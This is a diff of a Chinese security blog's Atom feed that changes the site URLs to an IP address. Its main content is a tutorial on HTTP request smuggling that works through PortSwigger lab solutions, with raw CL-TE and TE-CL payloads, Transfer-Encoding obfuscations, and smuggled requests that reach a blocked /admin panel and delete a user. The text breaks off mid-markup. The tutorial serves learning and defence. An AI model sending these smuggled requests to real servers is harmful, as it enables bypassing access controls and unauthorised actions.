@@ -3,11 +3,11 @@
   <title>Atkx&#39; blog</title>
   
   
-  <link href="https://atkx.gitee.io/atom.xml" rel="self"/>
+  <link href="http://47.119.122.254/atom.xml" rel="self"/>
   
-  <link href="https://atkx.gitee.io/"/>
+  <link href="http://47.119.122.254/"/>
   <updated>2021-04-12T12:10:20.807Z</updated>
-  <id>https://atkx.gitee.io/</id>
+  <id>http://47.119.122.254/</id>
   
   <author>
     <name>Atkx</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>USB流量分析</title>
-    <link href="https://atkx.gitee.io/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
-    <id>https://atkx.gitee.io/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
+    <link href="http://47.119.122.254/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
+    <id>http://47.119.122.254/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
     <published>2021-04-12T04:58:33.024Z</published>
     <updated>2021-04-12T12:10:20.807Z</updated>
     
@@ -31,18 +31,18 @@
     
     
     
-    <category term="流量分析" scheme="https://atkx.gitee.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
+    <category term="流量分析" scheme="http://47.119.122.254/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
   <entry>
     <title>HTTP请求走私</title>
-    <link href="https://atkx.gitee.io/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://atkx.gitee.io/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/</id>
+    <link href="http://47.119.122.254/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://47.119.122.254/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/</id>
     <published>2021-04-11T13:52:10.000Z</published>
-    <updated>2021-04-12T04:25:14.149Z</updated>
+    <updated>2021-04-22T11:13:53.206Z</updated>
     
-    <content type="html"><![CDATA[<p>摘要：HTTP请求走私漏洞</p> <a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><ul><li>利用Content-Length字段来判定请求体的内容长度 </li><li>利用Transfer-Encoding字段来判定请求体的结束位置</li></ul><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。</p><p>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li><li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li><li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li><li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li></ul><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>注：\r\n表示 CRLF即换行</strong></p><p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：</p><p>第一个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br></pre></td></tr></table></figure><p>第二个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br></pre></td></tr></table></figure><h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-Length: 5\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>得到响应，返回400 Bad Request<br><img src="https://img-blog.csdnimg.cn/20210406203744401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>触发过程</strong></p><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p><h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p><blockquote><p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p><p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210401195309792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://img-blog.csdnimg.cn/20210401195426801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G\r\n</span><br></pre></td></tr></table></figure><p>连续发送两次请求就可以获得响应。<br><img src="https://img-blog.csdnimg.cn/20210401195436975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>触发过程</strong></p><p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>此请求经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到<code>0\r\n\r\n</code>时，会被认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，G会被带入下一个请求，发送的请求在后端服务器变为 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br></pre></td></tr></table></figure><p>服务器在解析时会产生报错</p><h3 id="TE-TE漏洞"><a href="#TE-TE漏洞" class="headerlink" title="TE-TE漏洞"></a>TE-TE漏洞</h3><p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p><p>这里列出七种混淆方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。而我们所要做的就是找到其中存在问题的服务器，然后使用类似前两个情形的攻击报文走私数据。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.CL验环境</a><br><img src="https://img-blog.csdnimg.cn/20210406194449533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>连续发送两次请求<br><img src="https://img-blog.csdnimg.cn/20210406194916305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p><h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://img-blog.csdnimg.cn/20210401203035140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://img-blog.csdnimg.cn/20210401203313792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://img-blog.csdnimg.cn/20210401203510350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">......</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: 3\r\n</span><br><span class="line">\r\n</span><br><span class="line">1\r\n</span><br><span class="line">G\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>连续发送两次请求得到响应<br><img src="https://img-blog.csdnimg.cn/20210401204242691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>连续请求两次<br><img src="https://img-blog.csdnimg.cn/20210401205419277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>官方提供的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: your-lab-id.web-security-academy.net\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>得到响应<br><img src="https://img-blog.csdnimg.cn/20210401204904828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>成功报错。</p><p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p><p>后端服务器处理Content-Length标头，并确定请求主体的长度为4个字节，直到下一行的开始12。以下以开头的字节<code>GPOST / HTTP/1.1</code>未处理，后端服务器会将其视为序列中下一个请求的开始。</p><h2 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h2><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p><p><img src="https://img-blog.csdnimg.cn/20210408194510910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p><p>利用CL-TE漏洞，构造数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 37</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure><p>发现只能本地用户查看<br><img src="https://img-blog.csdnimg.cn/20210408195201254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>连续两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure><p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://img-blog.csdnimg.cn/20210408195343875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 116</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure><p>现在可以访问管理面板<br><img src="https://img-blog.csdnimg.cn/20210408195520760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 139</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure><p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://img-blog.csdnimg.cn/20210408201722326.png#pic_center" alt="在这里插入图片描述"></p><h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://img-blog.csdnimg.cn/20210408202433386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这次利用TE-CL漏洞，构造数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">60</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>允许本地查看<br><img src="https://img-blog.csdnimg.cn/20210408203126318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功访问管理员页面<br><img src="https://img-blog.csdnimg.cn/20210408203349163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 